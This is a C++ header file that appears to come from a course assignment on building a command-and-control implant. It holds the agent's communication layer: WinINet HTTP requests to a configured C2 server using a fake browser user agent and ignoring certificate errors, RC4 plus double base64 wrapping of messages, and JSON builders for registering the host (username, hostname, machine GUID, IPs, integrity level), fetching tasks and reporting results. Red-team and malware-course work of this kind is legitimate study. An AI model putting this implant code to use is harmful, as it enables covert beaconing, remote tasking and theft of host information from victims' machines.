#pragma once
//Contains various functions that handle network communications to the server and necessary data prepping/reading related to that (not including b64)
//Macros and dependences are imported in main.cpp and/or config.h (imported by main before this file)
#include "crypto.h"
//http_request as seen in HW03
BOOL http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
    LPCSTR postData, SIZE_T nPostDataSize, char **data, LPDWORD dwDataSize)
{
    HINTERNET hIntSession = NULL;
    HINTERNET hHttpSession = NULL;
    HINTERNET hHttpRequest = NULL;
    DWORD dwFlags = 0;

    BOOL ret = FALSE;

    do
    {
        // make sure to use INTERNET_OPEN_TYPE_PRECONFIG.
        hIntSession = InternetOpenA(
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            INTERNET_OPEN_TYPE_PRECONFIG,
            NULL,
            NULL,
            dwFlags
        );
        if (hIntSession == NULL)
        {
            break;
        }

        hHttpSession = InternetConnectA(hIntSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, dwFlags, NULL);
        if (hHttpSession == NULL)
        {
            break;
        }

        dwFlags = INTERNET_FLAG_RELOAD
            | INTERNET_FLAG_DONT_CACHE
            | INTERNET_FLAG_NO_UI
            | INTERNET_FLAG_KEEP_CONNECTION;

        if (secure)
        {
            dwFlags |= INTERNET_FLAG_SECURE;
        }

        hHttpRequest = HttpOpenRequestA(hHttpSession, verb, path, "HTTP/1.1", NULL, NULL, dwFlags, NULL);
        if (hHttpRequest == NULL)
        {
            break;
        }

        if (secure)
        {
            auto certOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                SECURITY_FLAG_IGNORE_REVOCATION;
            auto modSucess = InternetSetOptionA(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &certOptions, sizeof(certOptions));
            if (!modSucess)
            {
                break;
            }
        }

        if (!HttpSendRequestA(hHttpRequest, szHeaders, (DWORD)nHeaderSize, (LPVOID)postData, (DWORD)nPostDataSize))
        {
            break;
        }

        CHAR szBuffer[1024];
        CHAR *output = (CHAR*)malloc(1024);
        DWORD dwRead = 0;
        DWORD dwTotalBytes = 0;

        memset(output, 0, 1024);
        memset(szBuffer, 0, sizeof(szBuffer));

        while (InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead)
        {
            DWORD dwOffset = dwTotalBytes;
            dwTotalBytes += dwRead;

            output = (CHAR*)realloc(output, dwTotalBytes + 1);
            memcpy(output + dwOffset, szBuffer, dwRead);

            memset(szBuffer, 0, sizeof(szBuffer));
            dwRead = 0;
        }
        output[dwTotalBytes] = '\0';
        *data = output;
        COUT("DATA: " << *data);
        *dwDataSize = dwTotalBytes;

        ret = TRUE;
    } while (0);

    if (hHttpRequest)
    {
        InternetCloseHandle(hHttpRequest);
    }

    if (hHttpSession)
    {
        InternetCloseHandle(hHttpSession);
    }

    if (hIntSession)
    {
        InternetCloseHandle(hIntSession);
    }

    return ret;
}

// Sends a message with the specified string (containing json) and returns the response
BOOL send_message(std::string jsonToSend, std::string* out)
{
    //set up the vars
    char *data = NULL;
    DWORD dataSize = 0;
    std::string HEADER = "Content-Type: application/json; charset=utf-8";
    std::string content = "";
    std::string encoded_content = "";
    std::string payload = "";
    std::string encoded_data = "";
    std::string file_id_content = "";
    //BOOL ret = false;

    //json is already b64'd before this function

    BOOL request = FALSE;

    // Retry with sleeps if a request fails
    for (int attempt = 1; attempt <= MAX_RETRIES; attempt++)
    {
        //http_request("127.0.0.1", 9090, FALSE, "GET", "/5MB.zip", NULL, 0, NULL, 0, &data, &dataSize);
        request = http_request(C2HOST.c_str(), C2PORT, C2SSL, "POST", "/api/send", HEADER.c_str(), strlen(HEADER.c_str()), jsonToSend.c_str(), strlen(jsonToSend.c_str()), &data, &dataSize);

        if (request)
        {
            break;
        }
        else
        {
            COUT("Request failed, retrying...");
            Sleep(RETRY_SLEEP);
        }
    }

    if (!request) //sending failed
    {
        COUT("Request failed, no more retries...");
        return false;
    }

    //parse initial response 
    std::string response_str(data, dataSize);
    //reset for next message in the future
    free(data);
    data = NULL;
    dataSize = 0;

    //parsing response (including b64) will happen outside of this func

    //return the message
    *out = response_str;

    return true;
}

// data json to be nested inside d key before sending to server
bool dataJson(const std::string& in, int ht, std::string* out)
{
    json j;
    j["data"] = in;
    j["ht"] = ht;
    *out = j.dump();
    return true;
}

// data json to be nested inside d key before sending to server
bool dJson(const std::string& in, std::string* out)
{
    json j;
    j["d"] = in;
    *out = j.dump();
    return true;
}

std::string convert_and_send(const std::string in, int ht)
{
    std::string encrypted;
    Rc4Encrypt(in, KEY, &encrypted);
    std::string encoded_data;
    Base64Encode(encrypted, &encoded_data);

    std::string dataStr;
    dataJson(encoded_data, ht, &dataStr);

    std::string outer_encoded;
    Base64Encode(dataStr, &outer_encoded);
    std::string wrapper;
    dJson(outer_encoded, &wrapper);

    std::string response;
    if (!send_message(wrapper, &response))
    {
        COUT("Failed to send message");
        return {};
    }

    return response;
}

// Assembles the json for the task results message to the server
// const std::string& in, std::string* out
//Queued = 1. Pending = 2. Executing = 3. Complete = 4. Failed = 5. NotSupported = 6.
bool sendTaskResponseJson(std::string id, std::string result, int status, std::string* out)
{
    json j;
    j["ht"] = 3;
    j["agent_id"] = global_agent_id;
    j["id"] = id;
    j["result"] = result;
    j["status"] = status; // task status. Value that denotes the status. Queued = 1. Pending = 2. Executing = 3. Complete = 4. Failed = 5. NotSupported = 6.
    *out = j.dump();
    return true;
}

// Assembles the json for the registration message to the server
// const std::string& in, std::string* out
bool registrationJson(std::string* out)
{
    int integrity = getIntegrityLevel();

    if (integrity < 0)
    {
        return FALSE;
    }

    std::string ip;
    getIPAddress(&ip);

    std::wstring machineGuid = L"";
    if (!regGuid(&machineGuid)) {
        COUT("registrationJson error - regGuid - Could not access host machineGuid registry key!");
        return FALSE;
    }
    
    json j;
    //j["ht"] = 1;
    j["os"] = get_os_version();
    j["username"] = get_username();
    j["hostname"] = get_hostname();
    // We are authorized to use static fields for the following as we haven't covered them yet
    j["machine_guid"] = toString(machineGuid);
    j["internal_ip"] = ip;
    j["external_ip"] = "1.1.1.1"; // placeholder, server will populate external IP from POST request
    j["process_arch"] = 1; //Intentionally hardcoded as per spec
    j["integrity"] = integrity;
    *out = j.dump();
    return true;
}

// Assembles the json for the get next task message to the server
// const std::string& in, std::string* out
bool getNextTaskJson(std::string* out)
{
    json j;
    j["ht"] = 2;
    j["agent_id"] = global_agent_id;
    *out = j.dump();
    return true;
}
